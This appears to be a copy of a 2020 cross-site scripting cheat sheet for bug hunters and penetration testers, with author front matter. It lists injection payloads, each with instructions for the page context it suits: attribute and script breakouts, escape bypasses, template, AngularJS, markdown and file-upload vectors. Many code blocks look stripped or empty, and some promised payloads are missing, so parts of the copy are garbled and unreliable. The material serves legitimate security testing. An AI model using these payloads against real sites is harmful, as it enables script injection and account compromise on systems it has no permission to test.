### XSS Cheat Sheet – 2020 Edition

---

**© 2020 Brute Logic – All rights reserved.**

---

### XSS Cheat Sheet – 2020 Edition

"We only need to be lucky once. They need to be lucky every time."
— Adapted from an Irish Republican Army (IRA) statement, 1984.

---

**© 2020 Brute Logic – All rights reserved.**

---

### Disclaimer

The author and publisher are not responsible for the use of this material or any damage caused by the application of the information provided in this book.

---

### Introduction

This cheat sheet is designed for bug hunters, penetration testers, security analysts, web application security students, and enthusiasts. It focuses on Cross-Site Scripting (XSS), the most widespread and common flaw found on the World Wide Web. Familiarity with basic XSS concepts is recommended; for a primer, visit [my blog](https://brutelogic.com.br/blog/xss101).

This book does not aim to cover all existing work in the field but rather presents curated and original content on XSS, primarily from my own blog. If you have obtained a pirated version of this material, please consider making a donation to the author at [https://paypal.me/brutelogic](https://paypal.me/brutelogic).

The structure of this book is straightforward, with main subjects (Basics, Advanced, etc.) and a taxonomy for each situation. Each vector or payload is presented one per line, with directions for use. Some payloads are full scripts, with detailed usage instructions.

Please adapt the information to your specific scenario (e.g., single to double quotes). While I provide general guidance, the behavior of your target application may require further adjustments. Follow the instructions strictly: if something is presented in HTML format, it should be used that way. Otherwise, it is likely JavaScript code that can be used in both HTML and existing JavaScript code, unless specified otherwise.

I hope this cheat sheet serves as a valuable reference for your XSS-related needs. Enjoy!

Rodolfo Assis (Brute)

---

**© 2020 Brute Logic – All rights reserved.**

---

### About This Release

This release includes code that works with the latest stable versions of major Gecko-based browsers (Mozilla Firefox branches) and Chromium-based browsers (Google Chrome, Opera, Apple Safari, and Microsoft Edge). The current desktop versions are: Mozilla Firefox v73, Google Chrome v80, Opera v66, and Apple Safari v13. If you encounter issues or have suggestions for corrections, please contact me via Twitter @brutelogic or email brutelogic at null dot net.

Internet Explorer, although still considered a major browser, is minimally covered in this release. Some information from the previous edition has been removed, while new and updated information has been added.

---

**© 2020 Brute Logic – All rights reserved.**

---

### About The Author

Rodolfo Assis, also known as "Brute Logic" or simply "Brute," is a self-taught computer hacker from Brazil, working as a self-employed information security researcher and consultant. He is well-known for his contributions to various hacking topics on Twitter (@brutelogic), including hacking mindset, techniques, micro code, and humorous content. His primary research focus is Cross-Site Scripting (XSS).

Brute has helped fix over 1,000 XSS vulnerabilities in web applications worldwide through the Open Bug Bounty platform (formerly XSSposed). His clients include major tech companies such as Oracle, LinkedIn, Baidu, Amazon, Groupon, and Microsoft. From 2015 to 2017, he was a contributor to Sucuri’s Website Application Firewall (CloudProxy), gaining extensive experience in web vulnerabilities and security evasion.

Currently, he manages, maintains, and develops KNOXSS, an online XSS Proof-of-Concept tool that has assisted many bug hunters in finding and reporting vulnerabilities. He also runs a blog at [https://brutelogic.com.br](https://brutelogic.com.br).

Brute embodies the philosophy: "Don’t learn to hack, #hack2learn."

---

**© 2020 Brute Logic – All rights reserved.**

---

### Illustration

**Layout & Design:**
Rodolfo Assis
@rodoassis (Twitter)

**Cover photo by Andrew Neel on Unsplash.**

---

**© 2020 Brute Logic – All rights reserved.**

---

### Summary

1. **Basics** ……………………………………………………………………………………………………………..………. 7
2. **Advanced** ………………………………………………………………………………………………………………... 8
3. **Bypass** ……………………………………………………………………………………………………..…………..…. 12
4. **Exploiting** ……………………………………………………………………………………..…………………………. 21
5. **Extra** ……………………………………………………………………………..……………………….……………….. 24
6. **Brutal** ……………………………………………………………………………………………………………………… 28

---

**© 2020 Brute Logic – All rights reserved.**

---

### HTML Injection

Use when input lands inside an attribute’s value of an HTML tag or outside a tag, except for the cases described below. Prepend `-->` to the payload if the input lands in an HTML comment.

```html
">
```

### HTML Injection – Tag Block Breakout

Use when input lands inside or between the opening and closing tags of the following: `<script>`, `<style>`, and `<template>`.

```html
">
```

### HTML Injection - Inline

Use when input lands inside an attribute’s value of an HTML tag, but the tag cannot be terminated by a greater-than sign (`>`).

```html
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
```

### HTML Injection - Source

Use when input lands as a value of the following HTML tag attributes: `href`, `src`, `data`, or `action` (also `formaction`). The `src` attribute in script tags can be a URL or `data:,alert(1)`.

```javascript
javascript:alert(1)
```

### Javascript Injection

Use when input lands in a script block, inside a string delimited value.

```javascript
'-alert(1)-'
'/alert(1)//
```

### Javascript Injection - Escape Bypass

Use when input lands in a script block, inside a string delimited value, but quotes are escaped by a backslash.

```javascript
\'/alert(1)//
```

### Javascript Injection – Script Breakout

Use when input lands anywhere within a script block.

### Javascript Injection - Logical Block

Use the first or second payload when input lands in a script block, inside a string delimited value, and inside a single logical block like a function or conditional (if, else, etc.). If the quote is escaped with a backslash, use the third payload.

```javascript
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```

### Javascript Injection - Quoteless

Use when there is multi-reflection in the same line of JavaScript code. The first payload works in simple JavaScript variables, and the second one works in non-nested JavaScript objects.

```javascript
/alert(1)//\
/alert(1)}//\
```

### Javascript Context - Placeholder Injection in Template Literal

Use when input lands inside backticks (``) delimited strings or in template engines.

```javascript
${alert(1)}
```

### Multi Reflection HTML Injection - Double Reflection (Single Input)

Use to take advantage of multiple reflections on the same page.

```html
'onload=alert(1)>alert(1)/*
```

### Multi Reflection i HTML Injection - Triple Reflection (Single Input)

Use to take advantage of multiple reflections on the same page.

```html
*/alert(1)">'onload="/*'onload="`'>alert(1)/*
p=
q=
```

### File Upload Injection – Filename

Use when the uploaded filename is reflected somewhere on the target page.

```html
">.gif
```

### File Upload Injection – Metadata

Use when the metadata of an uploaded file is reflected somewhere on the target page. Use the command-line exiftool, and any metadata field can be set.

```bash
$ exiftool -Artist='">' xss.jpeg
```

### File Upload Injection – SVG File

Use to create a stored XSS on the target when uploading image files. Save the content below as `xss.svg`.

### DOM Insert Injection

Use to test for XSS when injection gets inserted into the DOM as valid markup instead of being reflected in the source code. It works for cases where script tags and other vectors won’t work.

### DOM Insert Injection – Resource Request

Use when native JavaScript code inserts into the page the results of a request to a URL that can be controlled by the attacker.

```html
data:text/html,
data:text/html,
```

### PHP Self URL Injection

Use when the current URL is used by the target’s underlying PHP code as an attribute value of an HTML form, for example. Inject between the PHP extension and the start of the query part (`?`) using a leading slash (`/`).

```html
https://brutelogic.com.br/xss.php/">?a=reader
```

### Markdown Vector

Use in text boxes, comment sections, etc., that allow some markup input. Click to fire.

```markdown
[clickme](javascript:alert`1`)
```

### Script Injection - No Closing Tag

Use when there is a closing script tag (`</script>`) somewhere in the code after reflection.

### Javascript postMessage() DOM Injection (with Iframe)

Use when there is a `message` event listener like `window.addEventListener('message', ...)` in JavaScript code without a check for origin. The target must be able to be framed (X-Frame Options header according to context). Save as an HTML file (or using `data:text/html`) providing `TARGET_URL` and `INJECTION` (an XSS vector or payload).

### XML-Based XSS

Use to inject an XSS vector in an XML page (content types `text/xml` or `application/xml`). Prepend `-->` to the payload if the input lands in a comment section or `]]>` if the input lands in a CDATA section.

```xml
alert(1)
```

### AngularJS Injections (v1.6 and up)

Use when there is an AngularJS library loaded in the page, inside an HTML block with the `ng-app` directive (first payload) or creating your own (second payload).

```html
{{$new.constructor('alert(1)')()}}
{{$new.constructor('alert(1)')()}}
```

### Onscroll Universal Vector

Use to XSS without user interaction when using the `onscroll` event handler. It works with the following HTML tags: `address`, `blockquote`, `body`, `center`, `dir`, `div`, `dl`, `dt`, `form`, `li`, `menu`, `ol`, `p`, `pre`, `ul`, and `h1` to `h6`.

```html
AAA#y
```

### Type Juggling

Use to pass an `if` condition matching a number in loose comparisons.

```html
1
1">
```

---

**© 2020 Brute Logic – All rights reserved.**